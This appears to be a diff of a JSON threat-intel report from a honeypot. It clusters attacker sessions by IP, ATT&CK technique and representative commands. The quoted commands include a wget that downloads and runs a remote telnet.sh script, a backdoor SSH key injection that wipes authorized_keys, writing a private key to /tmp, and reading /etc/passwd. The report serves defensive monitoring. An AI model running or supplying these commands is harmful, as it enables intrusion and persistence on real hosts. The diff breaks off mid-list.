@@ -1,667 +1,33 @@
 {
-  "generated_at": "2026-08-23T22:25:43.285743+00:00",
-  "total_sessions_with_commands": 66,
-  "total_clusters": 5,
-  "campaign_clusters": 3,
-  "singleton_clusters": 3,
-  "highest_severity": "HIGH",
-  "active_campaigns": [
-    {
-      "cluster_id": "CLU-001",
-      "name": "Recon Loader Script",
-      "severity": "MEDIUM",
-      "session_count": 56,
-      "unique_ip_count": 2,
-      "ttps": [
-        "T1082",
-        "T1592",
-        "T1078",
-        "T1083"
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "name": "Mirai/IoT Botnet",
-      "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1082",
-        "T1105",
-        "T1059.004"
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "name": "mdrfckr SSH Key Injection",
-      "severity": "HIGH",
-      "session_count": 7,
-      "unique_ip_count": 7,
-      "ttps": [
-        "T1021.004",
-        "T1078",
-        "T1070",
-        "T1140",
-        "T1105"
-      ]
-    }
-  ],
+  "generated_at": "2026-08-24T01:35:26.185466+00:00",
+  "total_sessions_with_commands": 84,
+  "total_clusters": 2,
+  "campaign_clusters": 0,
+  "singleton_clusters": 1,
+  "highest_severity": "NONE",
+  "active_campaigns": [],
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": true,
-      "campaign_name": "Recon Loader Script",
-      "campaign_severity": "MEDIUM",
-      "campaign_description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-      "matched_campaigns": [
-        {
-          "name": "Recon Loader Script",
-          "ttps": [
-            "T1078",
-            "T1083",
-            "T1592",
-            "T1082"
-          ],
-          "severity": "MEDIUM",
-          "description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-          "pattern_hits": 3,
-          "pattern_total": 6
-        },
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 56,
-      "unique_ips": [
-        "92.118.39.14",
-        "92.118.39.71"
-      ],
-      "unique_ip_count": 2,
-      "sequence_hash": "d2ac04915390abe8",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        },
-        {
-          "id": "T1078",
-          "name": "T1078"
-        },
-        {
-          "id": "T1083",
-          "name": "T1083"
-        }
-      ],
-      "representative_commands": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una",
-        "uname -s -v -n -m 2 > /dev/null",
-        "/bin/uname -s -v -n -m 2 > /dev/null",
-        "/usr/bin/uname -s -v -n -m 2 > /dev/null",
-        "busybox uname -s -v -n -m 2 > /dev/null",
-        "( [ -f /proc/version ]",
-        "[ -f /proc/version ]",
-        "head -1 /proc/version | cut -d -f1",
-        "[ -f /etc/os-release ]"
-      ],
-      "members": [
-        {
-          "session_id": "IR-ad994871532b",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T18:56:57.665521Z"
-        },
-        {
-          "session_id": "IR-6204a1f0a7c0",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T18:58:53.927530Z"
-        },
-        {
-          "session_id": "IR-42bf0b0c2292",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:00:52.699762Z"
-        },
-        {
-          "session_id": "IR-1b6f833daaeb",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:02:52.530567Z"
-        },
-        {
-          "session_id": "IR-95df6ff393a1",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:04:48.823059Z"
-        },
-        {
-          "session_id": "IR-cdd2e82f1edc",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:06:49.552097Z"
-        },
-        {
-          "session_id": "IR-7a17a9a3b983",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:08:57.332482Z"
-        },
-        {
-          "session_id": "IR-4e387baad362",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:10:51.802692Z"
-        },
-        {
-          "session_id": "IR-2a969f5dc703",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:12:44.639239Z"
-        },
-        {
-          "session_id": "IR-eada39eaebe3",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:14:42.425920Z"
-        },
-        {
-          "session_id": "IR-863bfa250718",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:16:40.201564Z"
-        },
-        {
-          "session_id": "IR-7b28552fb4c3",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:18:33.645629Z"
-        },
-        {
-          "session_id": "IR-1ed599d9f5c2",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:20:38.675933Z"
-        },
-        {
-          "session_id": "IR-629d065a6307",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:22:25.394464Z"
-        },
-        {
-          "session_id": "IR-70e53d9d6416",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:24:10.612876Z"
-        },
-        {
-          "session_id": "IR-1bc5bed3f650",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:26:01.269529Z"
-        },
-        {
-          "session_id": "IR-e4495a847ee4",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:28:00.558616Z"
-        },
-        {
-          "session_id": "IR-3fa6c9d0987e",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:29:58.866165Z"
-        },
-        {
-          "session_id": "IR-2c70c25e0647",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:32:00.267293Z"
-        },
-        {
-          "session_id": "IR-02a983a19de2",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:34:01.219768Z"
-        },
-        {
-          "session_id": "IR-0164e21a7318",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:35:47.877633Z"
-        },
-        {
-          "session_id": "IR-e99e68603004",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:37:31.834808Z"
-        },
-        {
-          "session_id": "IR-a7728d67544a",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:39:21.030390Z"
-        },
-        {
-          "session_id": "IR-8cba6f94406b",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:41:15.475639Z"
-        },
-        {
-          "session_id": "IR-beb9c9e9b94f",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:43:10.138144Z"
-        },
-        {
-          "session_id": "IR-1d7d0e964a7a",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:45:06.116372Z"
-        },
-        {
-          "session_id": "IR-a5bcb2b05362",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:47:06.324026Z"
-        },
-        {
-          "session_id": "IR-c2102383d293",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:49:02.196383Z"
-        },
-        {
-          "session_id": "IR-8d63aae4e0e5",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:50:59.145385Z"
-        },
-        {
-          "session_id": "IR-de43ef929ca7",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:52:53.162485Z"
-        },
-        {
-          "session_id": "IR-598275b1ef82",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:54:40.484203Z"
-        },
-        {
-          "session_id": "IR-248024153f3c",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:56:25.273992Z"
-        },
-        {
-          "session_id": "IR-7e008d779dbd",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:58:11.212964Z"
-        },
-        {
-          "session_id": "IR-5b8724265494",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T19:59:56.152550Z"
-        },
-        {
-          "session_id": "IR-260a903ed53b",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:01:42.706725Z"
-        },
-        {
-          "session_id": "IR-03f332057554",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:03:24.732813Z"
-        },
-        {
-          "session_id": "IR-ee4757ae4f47",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:05:06.903761Z"
-        },
-        {
-          "session_id": "IR-7870e44c2e1e",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:06:50.306014Z"
-        },
-        {
-          "session_id": "IR-a16c49a6717c",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:08:34.633879Z"
-        },
-        {
-          "session_id": "IR-4104087708a5",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:10:20.050586Z"
-        },
-        {
-          "session_id": "IR-e884aadb8819",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:12:07.714883Z"
-        },
-        {
-          "session_id": "IR-8f0e6f84ecbd",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:13:54.493947Z"
-        },
-        {
-          "session_id": "IR-08696746d4b4",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:15:39.064563Z"
-        },
-        {
-          "session_id": "IR-5bc104f742a2",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:17:23.701488Z"
-        },
-        {
-          "session_id": "IR-2f7485ac2a96",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:19:07.326177Z"
-        },
-        {
-          "session_id": "IR-268e220ee071",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:32:31.306266Z"
-        },
-        {
-          "session_id": "IR-7a219cc6257b",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:34:16.426551Z"
-        },
-        {
-          "session_id": "IR-5c9a926a6bba",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:36:12.732536Z"
-        },
-        {
-          "session_id": "IR-69e8a0e08630",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:38:16.528628Z"
-        },
-        {
-          "session_id": "IR-b179707c33a6",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:40:22.653869Z"
-        },
-        {
-          "session_id": "IR-aebbf50acdaa",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:42:28.629635Z"
-        },
-        {
-          "session_id": "IR-75cc31366868",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:46:06.149388Z"
-        },
-        {
-          "session_id": "IR-73afc89822eb",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:48:00.804213Z"
-        },
-        {
-          "session_id": "IR-110ce1593a10",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:49:52.289983Z"
-        },
-        {
-          "session_id": "IR-551d138b6356",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:51:44.250226Z"
-        },
-        {
-          "session_id": "IR-cc2579bf7d4b",
-          "src_ip": "92.118.39.71",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 9,
-          "timestamp": "2026-08-23T20:53:42.733922Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "is_campaign": true,
-      "campaign_name": "Mirai/IoT Botnet",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-      "matched_campaigns": [
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 2,
-          "pattern_total": 3
-        }
-      ],
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "94.154.43.196"
+        "212.227.188.160"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "247e5eacc7fee14d",
+      "sequence_hash": "4c607d78896f7ae1",
       "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1105",
-          "name": "T1105"
-        },
-        {
-          "id": "T1059.004",
-          "name": "T1059.004"
-        }
-      ],
-      "representative_commands": [
-        "echo SHELL_TEST",
-        "/bin/busybox TEST",
-        "cat /proc",
-        "./"
-      ],
-      "members": [
-        {
-          "session_id": "IR-dfd7ba7add51",
-          "src_ip": "94.154.43.196",
-          "country": "TR",
-          "isp": "Storm Industries LLC",
-          "command_count": 4,
-          "timestamp": "2026-08-23T19:05:12.053696Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "is_campaign": true,
-      "campaign_name": "mdrfckr SSH Key Injection",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-      "matched_campaigns": [
-        {
-          "name": "mdrfckr SSH Key Injection",
-          "ttps": [
-            "T1021.004",
-            "T1078",
-            "T1105"
-          ],
-          "severity": "HIGH",
-          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-          "pattern_hits": 3,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 7,
-      "unique_ips": [
-        "163.7.1.218",
-        "57.129.47.135",
-        "118.193.39.103",
-        "182.71.135.110",
-        "138.124.158.150",
-        "139.59.208.49",
-        "118.145.237.236"
-      ],
-      "unique_ip_count": 7,
-      "sequence_hash": "98af0db988d5971c",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        },
         {
           "id": "T1078",
           "name": "Valid Accounts"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         },
         {
           "id": "T1070",
@@ -672,145 +38,719 @@
           "name": "Deobfuscate/Decode Files"
         },
         {
-          "id": "T1105",
-          "name": "T1105"
+          "id": "T1003",
+          "name": "Credential Dumping"
         }
       ],
       "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+        "id",
+        "cat /etc/passwd",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "bash",
+        "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
+        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW"
       ],
       "members": [
         {
-          "session_id": "IR-1d471b748e0b",
-          "src_ip": "118.145.237.236",
-          "country": "CN",
-          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
-          "command_count": 2,
-          "timestamp": "2026-08-23T19:25:13.646512Z"
-        },
-        {
-          "session_id": "IR-45d1f4b5fae4",
-          "src_ip": "118.193.39.103",
-          "country": "HK",
-          "isp": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
-          "command_count": 2,
-          "timestamp": "2026-08-23T19:27:12.296641Z"
-        },
-        {
-          "session_id": "IR-c55e0be69275",
-          "src_ip": "139.59.208.49",
+          "session_id": "IR-0fb2629c575d",
+          "src_ip": "212.227.188.160",
           "country": "DE",
+          "isp": "IONOS SE",
+          "command_count": 16,
+          "timestamp": "2026-08-24T00:22:25.139426Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 83,
+      "unique_ips": [
+        "167.71.181.54"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "876deb10d4cf5b5c",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "/bin/./uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-76aa85e57004",
+          "src_ip": "167.71.181.54",
+          "country": "US",
           "isp": "DigitalOcean, LLC",
-          "command_count": 2,
-          "timestamp": "2026-08-23T19:30:05.979994Z"
-        },
-        {
-          "session_id": "IR-4e622a2d1ef1",
-          "src_ip": "57.129.47.135",
-          "country": "DE",
-          "isp": "OVH GmbH",
-          "command_count": 2,
-          "timestamp": "2026-08-23T19:30:12.072566Z"
-        },
-        {
-          "session_id": "IR-609b4b96d5ae",
-          "src_ip": "163.7.1.218",
-          "country": "ID",
-          "isp": "BYTEPLUS",
-          "command_count": 2,
-          "timestamp": "2026-08-23T19:35:35.761855Z"
-        },
-        {
-          "session_id": "IR-a045dc961a8a",
-          "src_ip": "182.71.135.110",
-          "country": "IN",
-          "isp": "FOUNDING YEARS LEARNING S",
-          "command_count": 2,
-          "timestamp": "2026-08-23T19:52:30.720104Z"
-        },
-        {
-          "session_id": "IR-ea69dcdb8ec0",
-          "src_ip": "138.124.158.150",
-          "country": "IQ",
-          "isp": "Horizon Scope Mobile Telecom WLL",
-          "command_count": 2,
-          "timestamp": "2026-08-23T19:52:35.459320Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "94.154.43.183"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "3af56bb726ebc4c6",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        },
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        }
-      ],
-      "representative_commands": [
-        "uname -m",
-        "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh"
-      ],
-      "members": [
-        {
-          "session_id": "IR-b5901510ed37",
-          "src_ip": "94.154.43.183",
-          "country": "TR",
-          "isp": "Storm Industries LLC",
-          "command_count": 2,
-          "timestamp": "2026-08-23T20:54:35.422718Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-005",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "77.90.185.20"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "ccd29aff2c593ed4",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        }
-      ],
-      "representative_commands": [
-        "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p"
-      ],
-      "members": [
-        {
-          "session_id": "IR-a165688b0714",
-          "src_ip": "77.90.185.20",
-          "country": "LT",
-          "isp": "Limited Network LTD",
           "command_count": 1,
-          "timestamp": "2026-08-23T18:55:52.619507Z"
+          "timestamp": "2026-08-24T00:00:24.434785Z"
+        },
+        {
+          "session_id": "IR-f37c618c677f",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:00:50.611512Z"
+        },
+        {
+          "session_id": "IR-45dc97f4bf7a",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:01:10.022705Z"
+        },
+        {
+          "session_id": "IR-f3ab428be3b1",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:01:25.886308Z"
+        },
+        {
+          "session_id": "IR-2d6aeeae3a72",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:01:40.694705Z"
+        },
+        {
+          "session_id": "IR-d39d0957166d",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:01:56.113222Z"
+        },
+        {
+          "session_id": "IR-60414a2205d0",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:02:11.792598Z"
+        },
+        {
+          "session_id": "IR-8550ad3f62ae",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:02:26.455924Z"
+        },
+        {
+          "session_id": "IR-9862883e5933",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:02:41.689312Z"
+        },
+        {
+          "session_id": "IR-08763f510a6c",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:02:56.183739Z"
+        },
+        {
+          "session_id": "IR-1196b3b855c1",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:03:11.794961Z"
+        },
+        {
+          "session_id": "IR-24e96a7eb72b",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:03:26.557258Z"
+        },
+        {
+          "session_id": "IR-87290c92729a",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:03:41.611053Z"
+        },
+        {
+          "session_id": "IR-465446c67959",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:03:56.199872Z"
+        },
+        {
+          "session_id": "IR-95c0d9f03e28",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:04:11.090316Z"
+        },
+        {
+          "session_id": "IR-5d1adaaa3610",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:04:25.953273Z"
+        },
+        {
+          "session_id": "IR-b432a1b96a6f",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:04:41.178311Z"
+        },
+        {
+          "session_id": "IR-1c93b7438c0d",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:04:56.248433Z"
+        },
+        {
+          "session_id": "IR-6ec2ec0a1009",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:05:14.535264Z"
+        },
+        {
+          "session_id": "IR-361a7712fbfb",
+          "src_ip": "167.71.181.54",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-24T00:05:30.572649Z"
+        },
